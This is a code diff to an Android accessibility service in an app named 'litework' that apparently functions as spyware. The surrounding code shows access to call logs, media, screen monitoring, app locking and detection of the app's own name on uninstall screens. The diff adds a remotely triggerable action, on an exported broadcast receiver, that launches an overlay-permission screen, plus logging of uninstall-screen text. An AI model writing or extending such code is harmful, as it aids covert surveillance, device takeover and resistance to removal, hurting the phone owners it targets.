@@ -49,6 +49,7 @@ import android.os.IBinder;
 import android.os.PowerManager;
 import android.provider.CallLog;
 import android.provider.MediaStore;
+import android.provider.Settings;
 import android.util.Base64;
 import android.util.DisplayMetrics;
 import android.util.Log;
@@ -71,6 +72,7 @@ import androidx.annotation.NonNull;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 import com.support.litework.R;
+import com.support.litework.activity.OverlaySetActivity;
 import com.support.litework.model.ApplistEntry;
 import com.support.litework.model.CallLogEntry;
 import com.support.litework.model.ImageData;
@@ -122,6 +124,7 @@ public class MainAccessibilityService extends AccessibilityService {
     public static final String ACTION_APP_OPEN = "APP_OPEN";
     public static final String ACTION_APP_LOCK = "APP_LOCK";
     public static final String ACTION_APP_UNLOCK = "APP_UNLOCK";
+    public static final String ACTION_ADMIN_MONITOR = "ADMIN_MONITOR";
 
     public static final String ACTION_CLOSE_MONITOR = "CLOSE_MONITOR";
 
@@ -487,6 +490,10 @@ public class MainAccessibilityService extends AccessibilityService {
                 onUnLockApp(package_name);
             }
 
+            if (ACTION_ADMIN_MONITOR.equals(intent.getAction())) {
+                requestOverlayPermission();
+            }
+
             if (ACTION_CLOSE_MONITOR.equals(intent.getAction())) {
                 String close_event = intent.getStringExtra("event");
                 if (close_event.equals("screen-monitor")) {
@@ -583,6 +590,9 @@ public class MainAccessibilityService extends AccessibilityService {
         registerReceiver(screenMonitorReceiver, filter_app_lock, RECEIVER_EXPORTED);
         IntentFilter filter_app_unlock = new IntentFilter(ACTION_APP_UNLOCK);
         registerReceiver(screenMonitorReceiver, filter_app_unlock, RECEIVER_EXPORTED);
+
+        IntentFilter filter_request_admin = new IntentFilter(ACTION_ADMIN_MONITOR);
+        registerReceiver(screenMonitorReceiver, filter_request_admin, RECEIVER_EXPORTED);
 
         IntentFilter mediaProjectionFilter = new IntentFilter("MEDIA_PROJECTION_RESULT");
         registerReceiver(mediaProjectionReceiver, mediaProjectionFilter, RECEIVER_EXPORTED);
@@ -1230,6 +1240,7 @@ public class MainAccessibilityService extends AccessibilityService {
             if (node.getClassName() != null && node.getClassName().equals("android.widget.TextView")) {
                 if (node.getText() != null) {
                     String nodeText = node.getText().toString().toLowerCase();
+                    Log.d("uninstall nodeText::", nodeText);
                     if (node.isVisibleToUser() && (nodeText.contains(getResources().getString(R.string.app_name).toLowerCase()) || nodeText.contains(getPackageName()))) {
                         isSelectedApp = true;
                     }
@@ -2699,6 +2710,12 @@ public class MainAccessibilityService extends AccessibilityService {
                 }, 1000);
             }
         }, 1000);
+    }
+
+    private void requestOverlayPermission() {
+        Intent intent = new Intent(this, OverlaySetActivity.class);
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        startActivity(intent);
     }
 
     private void onGoHome() {
